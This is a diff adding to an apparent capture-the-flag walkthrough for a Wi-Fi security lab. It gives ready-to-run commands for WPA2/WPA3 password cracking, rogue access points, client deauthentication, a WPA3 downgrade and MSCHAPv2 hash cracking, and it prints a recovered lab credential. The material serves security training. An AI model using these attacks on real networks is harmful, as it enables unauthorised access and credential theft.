@@ -252,8 +252,144 @@ hostapd-mana hostapd.conf
 
 <figure><img src="../.gitbook/assets/hostapd-mana.png" alt=""><figcaption></figcaption></figure>
 
-Once we have obtained the handshake we can crack it using “hashcat”
+Once we have obtained the handshake we can crack it using “hashcat”. Clear the hash and use it
 
 ```bash
-hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
+hashcat -a 0 -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force
 ```
+
+## SAE
+
+### What is the flag on the wifi-management AP website?
+
+In WPA3 networks it is still possible to brute force until the password is found, to do this we can use “wacker”.
+
+[https://github.com/blunderbuss-wctf/wacker](https://github.com/blunderbuss-wctf/wacker)
+
+{% code overflow="wrap" %}
+```bash
+./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
+```
+{% endcode %}
+
+![wacker](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/wacker.png#center)
+
+### What is the flag on the wifi-IT AP website?
+
+If a network with WPA3 SAE has a client configured for WPA2/WPA3 we can perform a downgrade against the client forcing it to connect to our RogueAP with WPA2 obtaining the handshake to crack it later, as in the case of wifi-offices. In this case we can see that the AP uses SAE and PSK, so maybe the clients accept PSK too. We can get this information in the airodump-ng “.csv” file.
+
+![sae](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/sae.png#center)
+
+hostapd-sae.conf
+
+```bash
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=11
+ssid=wifi-IT
+mana_wpaout=hostapd-management.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+```
+
+```bash
+hostapd-mana hostapd-sae.conf
+```
+
+We can check if the AP has MFP(802.11w) with Wireshark:
+
+![wireshark-mfp](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/wireshark-mfp.png#center)
+
+In this case 802.11w is disabled so we can deauth:
+
+```bash
+# In this case 802.11w is disabled so we can deauth
+iwconfig wlan0mon channel 11
+aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
+```
+
+![mana-sae](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/mana-sae.png#center)
+
+```bash
+hashcat -a 0 -m 2500 hostapd-management.hccapx ~/rockyou-top100000.txt --force
+```
+
+![hashcat-it](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/hashcat-it.png#center)
+
+## Recon MGT
+
+### What is the domain of the users of the wifi-regional network?
+
+In MGT networks misconfigured users can send their Identity (username) in clear text before performing the TLS tunnel, so with “airodump-ng” we can passively obtain this information. For this we simply use “airodump-ng” on the correct channel and wait for the clients to connect.
+
+```bash
+airodump-ng wlan0mon -w ~/wifi/scanc44 -c 44 --wps
+```
+
+then use wireshark to find a username
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+### What is the email address of the servers certificate?
+
+In Wireshark, just filter by certificates using the AP BBSID as filter (in this case any).
+
+```bash
+(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
+```
+
+### What is the EAP method supported by the wifi-global AP?
+
+In Wireshark, just filter by certificates using the AP BBSID as filter (in this case any).
+
+```bash
+(wlan.sa == f0:9f:c2:71:22:17) && (tls.handshake.certificate)
+```
+
+## MGT
+
+To attack a mistrusted client on an MGT network we have to create a RogueAP with the same ESSID and configuration but with a self-signed certificate.
+
+After putting our **wlan0** interface in monitor mode, we now have an interface called **wlan0mon**. We will identify the channel of the target AP and gather its ESSID and BSSID.
+
+Use Wireshark to search for the certificate.
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.
+
+As a root user, we'll need to navigate to /etc/freeradius/3.0/certs and change the settings of ca.cnf. We edit the **\[certificate\_authority]** fields to match our target CA certificate to appear less suspicious to clients in case they inspect the certificate.
+
+To create the certificates
+
+```
+make
+```
+
+We make the same attack against the MAC 10:F9:6F:07:6C:40
+
+```bash
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40
+```
+
+in parallel
+
+```bash
+airmon-ng start wlan1
+iwconfig wlan1mon channel 44
+aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:07:6C:40
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/TAFSTeZHI115sNtswQKaGg.png#center)
+
+Once connected we get your MSCHAPv2 credentials so we need to crack the hash to get the password in clear text. For this we use “hashcat”.
+
+```bash
+hashcat -a 0 -m 5500 hash ~/rockyou-top100000.txt --force
+```
+
+juan.tr:bulldogs1234\
